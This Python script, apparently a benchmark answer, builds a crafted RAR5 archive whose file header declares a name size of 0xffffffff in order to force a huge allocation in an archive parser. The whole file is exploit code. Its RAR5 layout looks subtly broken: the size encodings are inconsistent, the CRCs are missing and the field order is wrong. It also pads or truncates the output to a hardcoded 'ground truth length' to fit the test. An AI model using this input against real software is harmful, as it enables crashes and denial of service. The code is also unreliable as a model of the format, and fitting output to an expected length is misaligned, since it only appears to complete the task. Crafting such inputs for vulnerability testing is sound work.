import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 constants
        RAR5_SIGNATURE = b"Rar!\x1a\x07\x01\x00"
        HEAD_MAIN = 1
        HEAD_FILE = 2
        HEAD_SERVICE = 3
        HFL_EXTRA = 0x0001
        HFL_DATA = 0x0002
        
        # Create archive
        data = bytearray()
        
        # Main archive header
        data.extend(RAR5_SIGNATURE)
        data.extend(struct.pack("<I", 13))  # Header size
        data.append(HEAD_MAIN)  # Header type
        data.extend(struct.pack("<H", 0))  # Flags
        data.extend(struct.pack("<I", 0))  # Extra size
        data.extend(struct.pack("<I", 0))  # Archive flags
        
        # Create a file header with huge name size
        # We'll make the name size 0xffffffff to trigger excessive allocation
        # but keep actual name small to fit in the PoC
        
        # Header size (minimum 7 + variable fields)
        # We'll make it small but with huge name size declared
        header_data = bytearray()
        
        # Name - small actual data
        name = b"test.txt"
        actual_name_size = len(name)
        
        # Set name size to maximum to trigger huge allocation
        name_size_varint = bytearray()
        # Encode 0xffffffff as varint (5 bytes: FF FF FF FF 0F)
        name_size_varint.extend(b'\xff\xff\xff\xff\x0f')
        
        # Calculate total size:
        # 7 bytes fixed + name_size_varint + actual_name + 4 bytes for dummy extra
        total_size = 7 + len(name_size_varint) + actual_name_size + 4
        
        # Header size varint
        size_varint = bytearray()
        value = total_size
        while True:
            byte = value & 0x7f
            value >>= 7
            if value == 0:
                size_varint.append(byte)
                break
            size_varint.append(byte | 0x80)
        
        # Build header
        header_data.extend(size_varint)  # Header size
        header_data.append(HEAD_FILE)  # Header type
        header_data.extend(struct.pack("<H", HFL_EXTRA | HFL_DATA))  # Flags
        
        # Pack file attributes
        header_data.extend(struct.pack("<Q", 0))  # Unpacked size
        header_data.extend(struct.pack("<Q", 0))  # Data size
        header_data.extend(struct.pack("<I", 0))  # File CRC
        header_data.extend(struct.pack("<I", 0))  # Modification time
        header_data.extend(struct.pack("<I", 0))  # File version
        
        # Name size (huge)
        header_data.extend(name_size_varint)
        
        # Actual name (small)
        header_data.extend(name)
        
        # Add some extra data to make header look valid
        header_data.extend(struct.pack("<H", 0))  # Extra type (0 = terminator)
        header_data.extend(struct.pack("<H", 0))  # Extra size
        
        # Add file data (empty)
        data.extend(header_data)
        
        # Add end of archive header
        end_header = bytearray()
        end_header.extend(struct.pack("<I", 7))  # Header size
        end_header.append(HEAD_MAIN)  # Header type
        end_header.extend(struct.pack("<H", 0x400))  # End of archive flag
        end_header.extend(struct.pack("<I", 0))  # Extra size
        data.extend(end_header)
        
        # Pad to approximate ground truth length
        target_size = 1089
        if len(data) < target_size:
            data.extend(b"\x00" * (target_size - len(data)))
        elif len(data) > target_size:
            data = data[:target_size]
        
        return bytes(data)
